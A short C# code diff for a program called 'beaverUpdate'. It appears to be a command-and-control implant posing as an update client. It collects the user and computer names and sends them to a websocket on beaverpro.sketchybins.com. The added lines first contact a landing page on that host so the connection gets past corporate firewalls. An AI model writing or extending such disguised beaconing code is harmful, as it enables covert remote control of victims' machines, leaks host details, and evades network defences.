@@ -9,6 +9,7 @@ using System.Runtime.CompilerServices;
 using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Security.Policy;
 
 namespace beaverUpdate
 {
@@ -52,6 +53,11 @@ namespace beaverUpdate
             // Connect to the "update" server
             ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
             var client = $"{hostInfo.UserName}@{hostInfo.ComputerName}";
+
+            // For corp firewalls, need to init a connection before the websocket
+            string landingpage = "http://beaverpro.sketchybins.com/";
+            Task<string> webRequestTask = WebRequestHelper.PerformWebRequestAsync(landingpage);
+            await Task.Delay(3000); // giving the firewall some time
             Task socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com/checkupdate?client={client}"));
             
 
